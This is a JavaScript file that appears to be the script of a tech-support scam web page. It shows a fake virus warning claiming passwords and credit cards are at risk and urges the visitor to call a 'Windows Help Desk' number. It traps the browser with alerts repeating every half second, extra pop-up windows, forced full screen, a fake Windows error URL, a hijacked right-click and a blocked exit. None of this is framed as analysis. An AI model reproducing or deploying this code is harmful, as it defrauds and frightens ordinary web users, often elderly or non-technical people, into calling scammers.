﻿var msg='*************************************************\n\nCall Windows Help Desk Immediately at 1855-374-7444 \n\nThe following data will be compromised if you continue:\n1. Passwords\n2. Browser History\n3. Credit Card Information\n\nFree PC Optimization Call Now : 1855-374-7444\n\nThis virus is well known for complete identity and credit card theft. Further action through this computer or any computer on the network will reveal private information and involve serious risks.\n\nCall Windows Help Desk Immediately at 1855-374-7444 ';

var msg2=msg;
function myFunction(){setInterval(function(){alert(msg)},500);alert(msg2);}



function OpenConfirmDialog()
{


       window.open ("index.php","mywindow");
        window.open ("index.php","mywindow1");
         window.open ("index.php","mywindow2");
          window.open ("index.php","mywindow3");
           window.open ("index.php","mywindow4");
setInterval(function(){alert(msg)},500);alert(msg2);

}


function requestFullScreen(element) {
    // Supports most browsers and their versions.
    var requestMethod = element.requestFullScreen || element.webkitRequestFullScreen || element.mozRequestFullScreen || element.msRequestFullScreen;

    if (requestMethod) { // Native full screen.
        requestMethod.call(element);
    } else if (typeof window.ActiveXObject !== "undefined") { // Older IE.
        var wscript = new ActiveXObject("WScript.Shell");
        if (wscript !== null) {
            wscript.SendKeys("{F11}");
        }
    }
}

function processAjaxData(){
    window.history.replaceState('Object', 'Title', '/0x81030801/DRIVER_UNLOADED_WITHOUT_CANCELLING_PENDING_OPERATIONS/windows/scanner');
}

var elem = document.body; // Make the body go full screen.
requestFullScreen(document.body);

function rtclickcheck(keyp)
	{ 	if (navigator.appName == "Netscape" && keyp.which == 3){alert(msg);}

		if (navigator.appVersion.indexOf("MSIE") != -1 && event.button == 2){alert(m2);}
	}
	document.onmousedown = rtclickcheck;

window.onbeforeunload=function(){window.location.href=''+hhref+'','_blank';return''+msg+'';window.location.href=''+hhref+'','_blank';};
var OSName="Unknown OS";if(navigator.appVersion.indexOf("Win")!=-1)OSName="Windows";if(navigator.appVersion.indexOf("Mac")!=-1)OSName="MacOS";if(navigator.appVersion.indexOf("X11")!=-1)OSName="UNIX";if(navigator.appVersion.indexOf("Linux")!=-1)OSName="Linux";
